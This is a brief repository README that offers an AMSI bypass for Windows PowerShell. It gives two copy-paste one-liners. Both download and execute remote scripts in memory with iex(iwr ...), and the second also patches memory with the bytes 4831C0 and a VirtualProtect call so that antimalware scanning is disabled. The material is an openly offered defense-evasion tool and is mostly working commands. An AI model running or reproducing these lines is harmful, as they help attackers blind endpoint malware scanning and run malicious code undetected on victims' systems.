# AMSI
Another amsi bypass code. 

Usage :
Fast one liner, copy paste mode. 
1. Simple, nice, clean and readable :) - Load two file from remote 
```
iex(iwr https://raw.githubusercontent.com/zief/AMSI/main/aman.txt -Usebasicparsing);Start-sleep -s 3;iex(iwr https://raw.githubusercontent.com/zief/AMSI/main/lain.txt -Usebasicparsing)
```

2. Load one remotely, and one in the oneliner.
```
iex(iwr https://raw.githubusercontent.com/zief/AMSI/main/aman.txt -Usebasicparsing);$hexString = "4831C0";$3b = [Byte[]]::new($hexString.Length / 2);for ($i = 0; $i -lt $hexString.Length; $i += 2) {$3b[$i / 2] = [Convert]::ToByte($hexString.Substring($i, 2), 16)};[System.Runtime.InteropServices.Marshal]::Copy($3b, 0, $alamat, $3b.Length);$vp.Invoke($alamat, $3b.Length, 0x20, [ref]$tua)
```
